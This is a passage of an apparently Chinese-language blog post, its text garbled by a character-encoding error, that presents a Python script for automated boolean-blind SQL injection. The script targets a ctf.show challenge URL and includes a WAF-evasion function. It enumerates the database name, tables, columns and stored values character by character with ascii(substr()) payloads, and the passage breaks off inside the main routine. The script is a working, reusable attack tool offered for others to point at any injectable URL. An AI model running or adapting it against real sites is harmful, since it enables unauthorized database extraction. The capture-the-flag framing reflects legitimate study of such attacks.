class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure><h2 id="5ã€Bypass-WAF"><a href="#5ã€Bypass-WAF" class="headerlink" title="5ã€Bypass_WAF"></a>5ã€Bypass_WAF</h2><p>è¿™é‡Œä¹Ÿå°±æ˜¯ç”¨æ¥ç»•è¿‡WAF çš„æ–¹æ³•ï¼Œé’ˆå¯¹åŸºæœ¬çš„æ³¨å…¥è¯­å¥è¿›è¡Œè°ƒæ•´ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™å¯¹payload è¿›è¡Œè°ƒæ•´æ›¿æ¢ï¼Œç»•è¿‡WAF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">### ç»•è¿‡è¿‡æ»¤</span><br><span class="line">def Bypass_WAF(payload):</span><br><span class="line">    # or ä»£æ›¿ and</span><br><span class="line">    #payload = re.sub(r&#x27;and&#x27;,&#x27;or&#x27;, payload)</span><br><span class="line"></span><br><span class="line">    # å¤§å°å†™</span><br><span class="line">    #payload = re.sub(r&#x27;where&#x27;,&#x27;WHerE&#x27;, payload)</span><br><span class="line"></span><br><span class="line">    # ç©ºæ ¼æ›¿æ¢</span><br><span class="line">    payload = re.sub(r&#x27;%20&#x27;,&#x27;/**/&#x27;,payload)</span><br><span class="line">    payload = re.sub(r&#x27; &#x27;,&#x27;/**/&#x27;,payload)</span><br><span class="line"></span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><h1 id="å››ã€è„šæœ¬å†…å®¹"><a href="#å››ã€è„šæœ¬å†…å®¹" class="headerlink" title="å››ã€è„šæœ¬å†…å®¹"></a>å››ã€è„šæœ¬å†…å®¹</h1><p><strong>ä½¿ç”¨æ³¨æ„ç‚¹ï¼š</strong></p><ol><li>å…¨å±€çš„url éœ€è¦æ”¹å˜ï¼Œæ˜¯SQLæ³¨å…¥çš„åœ°å€ï¼ˆè®°å¾—ç»™æ³¨å…¥é—­åˆç¬¦ï¼Œå¦‚ï¼š<a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a>â€œ ï¼‰</li><li>ä¿®æ”¹çˆ†ç ´è¿‡ç¨‹ä¸­ä½¿ç”¨çš„æ¨æµ‹å‚æ•°ï¼ˆå¦‚æœpayloadæ²¡é—®é¢˜ï¼Œä½†è„šæœ¬ä¾ç„¶æç¤ºé”™è¯¯ï¼Œå¯ä»¥é€‚é‡å¢åŠ çˆ†ç ´å‚æ•°ï¼‰</li><li>å“åº”åŒ…åˆ¤æ–­ï¼ˆéœ€è¦ä¿®æ”¹ï¼Œä¸åŒçš„è¯·æ±‚ï¼Œå“åº”åŒ…è‚¯å®šæ˜¯ä¸åŒçš„ï¼Œå¯ä»¥è°ƒè¯•payloadï¼‰</li><li>å¯ä»¥åœ¨Bypass_WAFæ–¹æ³•ä¸­å¯¹åŸºæœ¬çš„payload è¿›è¡Œæ›¿æ¢ä¿®æ”¹ï¼Œç»•è¿‡WAF</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">### ä»¥ä¸‹æ˜¯åˆå§‹ç¯å¢ƒå˜é‡</span><br><span class="line">url = &#x27;http://ebc6d8a1-5b14-49bf-876f-6ad3e86db03d.challenge.ctf.show/index.php?id=1&#x27;</span><br><span class="line"></span><br><span class="line">### çˆ†ç ´è¿‡ç¨‹ä¸­ä½¿ç”¨çš„æ¨æµ‹å‚æ•°</span><br><span class="line">database_len_max = 20   #æ¨æµ‹æ•°æ®åº“åç§°çš„æœ€å¤§é•¿åº¦</span><br><span class="line">table_num_max = 10      #æ¨æµ‹è¯¥æ•°æ®åº“ä¸­æœ€å¤§è¡¨çš„æ•°é‡</span><br><span class="line">table_len_max = 20      #æ¨æµ‹æ•°æ®åº“è¡¨åç§°çš„æœ€å¤§é•¿åº¦</span><br><span class="line">column_num_max = 20     #æ¨æµ‹è¯¥æ•°æ®åº“è¡¨ä¸­å­—æ®µçš„æœ€å¤§æ•°é‡</span><br><span class="line">column_len_max = 20     #æ¨æµ‹æ•°æ®åº“è¡¨å­—æ®µåç§°çš„æœ€å¤§é•¿åº¦</span><br><span class="line">data_num_max = 10       #æ¨æµ‹è¯¥æ•°æ®åº“è¡¨å­—æ®µæ•°å€¼ä¸­æœ€å¤§çš„æ•°é‡</span><br><span class="line">data_len_max = 50     #æ¨æµ‹æ•°æ®åº“è¡¨å­—æ®µæ•°å€¼çš„æœ€å¤§é•¿åº¦(33å¯æŸ¥md5)</span><br><span class="line"></span><br><span class="line">### è¿›åº¦æ¡è®¾ç½®</span><br><span class="line">jindu_left = 0</span><br><span class="line">threading_status = False    #å‰¯çº¿ç¨‹ä¸æ‰§è¡Œ</span><br><span class="line">threading_stop = False      #å‰¯çº¿ç¨‹åœæ­¢å‚æ•°</span><br><span class="line">asciis = string.printable   #string.printableè¡¨ç¤ºæ‰€æœ‰å¯æ‰“å°çš„asciiå­—ç¬¦</span><br><span class="line"></span><br><span class="line">### è¯·æ±‚å‘é€ï¼Œå“åº”åˆ¤æ–­</span><br><span class="line">def Response_judgment(payload):</span><br><span class="line">    global url</span><br><span class="line">    # ï¼ˆ1ï¼‰æ˜¯å¦è¿›è¡Œurl è¿‡æ»¤</span><br><span class="line">    payload = Bypass_WAF(payload)</span><br><span class="line">    new_url = url + payload</span><br><span class="line">    #print(new_url)</span><br><span class="line"></span><br><span class="line">    # ï¼ˆ2ï¼‰å‘é€å¸¦cookieçš„å’Œæ³¨é‡Šçš„GETè¯·æ±‚ç¤ºä¾‹</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        &#x27;level&#x27; : &#x27;1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    respone = requests.get(new_url+&#x27;--+&#x27;, cookies=cookies)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    response = requests.get(new_url + &#x27;/**/and/**/1=1&#x27;)</span><br><span class="line"></span><br><span class="line">    # ï¼ˆ2ï¼‰å‘é€å¸¦cookieå’Œdataå’Œæ³¨é‡Šçš„POSTè¯·æ±‚ç¤ºä¾‹</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload = &quot;admin&#x27;&quot; + payload + &quot;/**/and/**/1=1&quot;</span><br><span class="line">    #print(payload)</span><br><span class="line">    new_url = url</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;username&#x27;  :   &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27;  :   payload</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url = new_url, data = data)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    # ï¼ˆ3ï¼‰å“åº”åŒ…åˆ¤æ–­</span><br><span class="line">    if &quot;If&quot; in response.text:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">### ç»•è¿‡è¿‡æ»¤</span><br><span class="line">def Bypass_WAF(payload):</span><br><span class="line">    # ä»£æ›¿ and</span><br><span class="line">    #payload = re.sub(r&#x27;and&#x27;,&#x27;or&#x27;, payload)</span><br><span class="line"></span><br><span class="line">    # å¤§å°å†™</span><br><span class="line">    #payload = re.sub(r&#x27;where&#x27;,&#x27;WHerE&#x27;, payload)</span><br><span class="line"></span><br><span class="line">    # ç©ºæ ¼æ›¿æ¢</span><br><span class="line">    payload = re.sub(r&#x27;%20&#x27;,&#x27;/**/&#x27;,payload)</span><br><span class="line">    payload = re.sub(r&#x27; &#x27;,&#x27;/**/&#x27;,payload)</span><br><span class="line"></span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µçš„æ•°å€¼</span><br><span class="line">def column_data_name(column_data_len,User_table_name,User_column_name):</span><br><span class="line">    column_data_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_data_len)):         #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µçš„å€¼</span><br><span class="line">        for j in range(1,column_data_len[i]+1):     #jæ˜¯è¦çˆ†ç ´å­—æ®µå€¼çš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for n in asciis:                        #asciisæ˜¯è¦çˆ†ç ´å­—æ®µå€¼çš„asciiç å€¼</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select &quot; + User_column_name + &quot; from &quot; + User_table_name + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    column_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n&#123;User_column_name&#125;å­—æ®µçš„ç¬¬&#123;i&#125;ä¸ªå€¼ä¸ºï¼š&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_data_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_data_names</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µæ•°å€¼çš„é•¿åº¦</span><br><span class="line">def column_data_length(User_table_name,User_column_name):</span><br><span class="line">    column_data_len = &#123;&#125;</span><br><span class="line">    for i in range(0,data_num_max):           #åªæŸ¥è¯¢10ä¸ªæ•°å€¼</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,data_len_max):       #jæ˜¯è¦çˆ†ç ´å­—æ®µæ•°å€¼çš„é•¿åº¦ï¼ŒçŒœæµ‹è¯¥å­—æ®µæ•°å€¼æœ€å¤§ä¸º32ï¼ˆå³md5å€¼ï¼Œå¯èƒ½éœ€è¦ä¿®æ”¹ï¼‰</span><br><span class="line">            payload = &quot;%20and%20length((select &quot;+ User_column_name +&quot; from &quot;+ User_table_name +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                column_data_len[i] = j</span><br><span class="line">                if i == data_num_max:</span><br><span class="line">                    print(&#x27;å·²è¶…è¿‡æµ‹è¯•æ•°å€¼çš„æœ€å¤§å€¼ï¼Œè¯·è°ƒæ•´ï¼ï¼ï¼&#x27;)</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return column_data_len</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µçš„åç§°</span><br><span class="line">def column_name(column_len,User_table_name):</span><br><span class="line">    column_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_len)):          #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µï¼Œlen(column_len) æ˜¯å­—æ®µçš„æ•°é‡</span><br><span class="line">        for j in range(1,column_len[i]+1):      #jæ˜¯è¦çˆ†ç ´å­—æ®µçš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for n in asciis:              #næ˜¯è¦çˆ†ç ´å­—æ®µåçš„asciiç å€¼</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot; + hex(int.from_bytes(User_table_name.encode(),&#x27;big&#x27;)) + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    column_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n&#123;User_table_name&#125;è¡¨çš„ç¬¬&#123;i&#125;ä¸ªå­—æ®µçš„åç§°ä¸ºï¼š&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_names</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µçš„é•¿åº¦</span><br><span class="line">def column_length(User_table_name):     #è¦æŸ¥çœ‹çš„è¡¨å</span><br><span class="line">    column_len = &#123;&#125;</span><br><span class="line">    for i in range(0,column_num_max):               #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µï¼Œè¿™é‡Œå‡è®¾æœ‰10ä¸ªå­—æ®µ</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,column_len_max):           #jæ˜¯è¦çˆ†ç ´å­—æ®µçš„é•¿åº¦ï¼Œå‡è®¾å­—æ®µé•¿åº¦æœ€é•¿ä¸º20</span><br><span class="line">            payload = &quot;%20and%20length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;+ hex(int.from_bytes(User_table_name.encode(), &#x27;big&#x27;)) +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                column_len[i] = j</span><br><span class="line">                if i == column_num_max:</span><br><span class="line">                    print(&quot;\033[91m[-]\033[0m å·²è¶…è¿‡æµ‹è¯•å­—æ®µæ•°çš„æœ€å¤§å€¼ï¼Œè¯·è°ƒæ•´ï¼ï¼ï¼&quot;)</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return column_len</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨çš„åç§°</span><br><span class="line">def table_name(table_len):</span><br><span class="line">    table_names = &#123;&#125;</span><br><span class="line">    table_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(table_len)):       #iæ˜¯ç¬¬å‡ å¼ è¡¨ï¼Œlen(table_len)è¡¨ç¤ºå…±æœ‰å‡ å¼ è¡¨</span><br><span class="line">        for j in range(1,table_len[i]+1):   #jæ˜¯è¦çˆ†ç ´è¡¨åç¬¬å‡ ä¸ªå­—ç¬¦ï¼Œåˆ°è¡¨çš„é•¿åº¦</span><br><span class="line">            for n in asciis:          #næ˜¯è¦çˆ†ç ´è¡¨åçš„asciiç å€¼</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    table_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\nç¬¬&#123;i&#125;å¼ è¡¨çš„åç§°ä¸ºï¼š&#123;table_one_name&#125;&quot;)</span><br><span class="line">        table_names[i] = table_one_name</span><br><span class="line">        table_one_name = &#x27;&#x27;</span><br><span class="line">    return table_names</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“è¡¨çš„é•¿åº¦</span><br><span class="line">def table_length():</span><br><span class="line">    table_len = &#123;&#125;</span><br><span class="line">    for i in range(0,table_num_max):</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,table_len_max):</span><br><span class="line">            payload = &quot;%20and%20length((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                table_len[i] = j</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return table_len</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“çš„åç§°</span><br><span class="line">def database_name(database_len):</span><br><span class="line">    database_names = &#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        for i in range(1,database_len + 1):     #iæ˜¯æ•°æ®åº“çš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for j in asciis:                    #jæ˜¯è¦çˆ†ç ´æ•°æ®åº“åçš„asciiç å€¼</span><br><span class="line">                payload = &quot;%20and%20ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    database_names += j</span><br><span class="line">                    break</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\n\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·æ£€æŸ¥\033[91mResponse_judgmentå‡½æ•°ã€URLã€payloadã€å¢åŠ çˆ†ç ´çš„æ•°æ®åº“åé•¿åº¦ï¼ï¼ï¼\033[0m&quot;)</span><br><span class="line">    return database_names</span><br><span class="line"></span><br><span class="line">### æŸ¥è¯¢æ•°æ®åº“çš„é•¿åº¦</span><br><span class="line">def database_length():</span><br><span class="line">    try:</span><br><span class="line">        for i in range(1,database_len_max):</span><br><span class="line">            payload = &quot;%20and%20length(database())=&quot; + str(i)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                return i</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·æ£€æŸ¥\033[91mResponse_judgmentå‡½æ•°ã€URLã€payloadã€å¢åŠ çˆ†ç ´çš„æ•°æ®åº“åé•¿åº¦ï¼ï¼ï¼\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line"></span><br><span class="line">def Progress_bar():</span><br><span class="line">    # åˆå§‹åŒ–å‚æ•°</span><br><span class="line">    global threading_status</span><br><span class="line">    global jindu_left</span><br><span class="line"></span><br><span class="line">    while not threading_stop:</span><br><span class="line">        while threading_status:</span><br><span class="line">            progress_bar = &quot;\033[94m[*]\033[0m æŸ¥è¯¢ä¸­ï¼š\033[92m[\033[0m&#123;0&#125;\033[92m]\033[0m&quot;.format(&quot; &quot; * jindu_left + &quot;\033[92m*\033[0m&quot; + &quot; &quot; * (50 - jindu_left))</span><br><span class="line"></span><br><span class="line">            # æ¸…é™¤ä¹‹å‰çš„è¿›åº¦æŒ‡ç¤ºå™¨è¾“å‡º</span><br><span class="line">            sys.stdout.write(&quot;\r&quot; + progress_bar)</span><br><span class="line"></span><br><span class="line">            # åˆ·æ–°è¾“å‡ºï¼Œç¡®ä¿è¿›åº¦æŒ‡ç¤ºå™¨ç«‹å³æ›´æ–°</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">            jindu_left = 0 if jindu_left == 50 else jindu_left + 1</span><br><span class="line"></span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">def kill():</span><br><span class="line">    global threading_status</span><br><span class="line">    global threading_stop</span><br><span class="line"></span><br><span class="line">    print(&quot;\033[91m[-]\033[0m æ­£åœ¨é€€å‡ºï¼Œè¯·ç­‰å¾…ï¼ï¼ï¼&quot;)</span><br><span class="line">    threading_status = False</span><br><span class="line">    threading_stop = True</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;Byeï¼ç¨‹åºå·²é€€å‡ºï¼ï¼ï¼&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">### ä¸»ç¨‹åº</span><br><span class="line">def main():</span><br><span class="line">    print(f&#x27;--------- &#123;__file__&#125; å¼€å§‹è¿è¡Œ ---------------&#x27;)</span><br><span class="line">    # ï¼ˆ1ï¼‰åˆå§‹åŒ–ç¯å¢ƒå’Œå‚æ•°å˜é‡</span><br><span class="line">    global threading_status</span><br><span class="line">    print(&#x27;\033[94m[*]\033[0m æ³¨æ„ï¼šè¯¥è„šæœ¬ä½¿ç”¨çš„å‰ææ˜¯çŸ¥é“æ³¨å…¥ç‚¹å­˜åœ¨çš„URLã€é¡µé¢å›æ˜¾å±äºå¸ƒå°”ç±»å‹ã€è¿‡æ»¤çš„æ–¹æ³•ã€ä»¥åŠcookieç›¸å…³&#x27;)</span><br><span class="line">    print(&#x27;\033[94m[*]\033[0m æ³¨æ„ï¼šåœ¨ä½¿ç”¨å‰è¯·\033[91mä¿®æ”¹url å’Œ Response_judgment å‡½æ•°\033[0m&#x27;)</span><br><span class="line">    # åˆ›å»ºä¸€ä¸ªå‰¯çº¿ç¨‹å¯¹è±¡</span><br><span class="line">    sub_thread = threading.Thread(target=Progress_bar)</span><br><span class="line">    sub_thread.start()      # å¯åŠ¨å‰¯çº¿ç¨‹</span><br><span class="line"></span><br><span class="line">    # ï¼ˆ2ï¼‰å¼€å§‹æŸ¥è¯¢æ•°æ®åº“</span><br><span class="line">    print(&#x27;\033[93m---------------------------- æ•°æ®åº“åæŸ¥è¯¢ä¸­ ------------------------------\033[0m&#x27;)</span><br><span class="line">    threading_status = True     #å¼€å¯å‰¯çº¿ç¨‹</span><br><span class="line">    database_names = database_name(database_length())   #è¿™é‡Œä¼ å…¥æ•°æ®åº“çš„é•¿åº¦</span><br><span class="line">    threading_status = False    #å…³é—­å‰¯çº¿ç¨‹</span><br><span class="line">    if not database_names:</span><br><span class="line">        print(&quot;\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·è°ƒæ•´\033[91mdatabase_lengthå‡½æ•°ä¸­å¯¹æ•°å€¼çˆ†ç ´çš„é•¿åº¦å€¼ï¼Œæˆ–æ£€æŸ¥ä½¿ç”¨çš„payload\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line">    print(f&quot;\n\033[92m[+]\033[0m å½“å‰\033[96mæ•°æ®åº“å\033[0mä¸ºï¼š\033[94m&#123;database_names&#125;\033[0m&quot;)</span><br><span class="line">    # ï¼ˆ3ï¼‰å¼€å§‹æŸ¥è¯¢æ•°æ®åº“è¡¨</span><br><span class="line">    print(&#x27;\033[93m---------------------------- æ•°æ®åº“è¡¨æŸ¥è¯¢ä¸­ ------------------------------\033[0m&#x27;)</span><br><span class="line">    threading_status = True     # å¯åŠ¨å‰¯çº¿ç¨‹</span><br><span class="line">    table_names = table_name(table_length())            #æ±‚è¡¨çš„åç§°ï¼Œä¼ å…¥è¡¨çš„é•¿åº¦</span><br><span class="line">    threading_status = False    #å…³é—­å‰¯çº¿ç¨‹</span><br><span class="line">    if len(table_names) == 0:</span><br><span class="line">        print(&quot;\n\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·è°ƒæ•´\033[91mtable_lengthå‡½æ•°ä¸­å¯¹æ•°å€¼çˆ†ç ´çš„é•¿åº¦å€¼ï¼Œæˆ–æ£€æŸ¥ä½¿ç”¨çš„payload\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line">    while True:                 #è¿™é‡Œåšæ— é™å¾ªç¯ï¼Œä»¥æ–¹ä¾¿å¾ªç¯æŸ¥è¯¢æ‰€æœ‰çš„è¡¨</span><br><span class="line">        print(&#x27;\n\033[93m---------------------------- é€‰æ‹©æŸ¥è¯¢çš„åº“è¡¨ ------------------------------\033[0m&#x27;)</span><br><span class="line">        print(f&quot;\033[92m[+]\033[0m &#123;database_names&#125;æ‰€æœ‰\033[96mè¡¨å\033[0mä¸ºï¼š\033[94m&#123;table_names&#125;\033[0m&quot;)</span><br><span class="line">       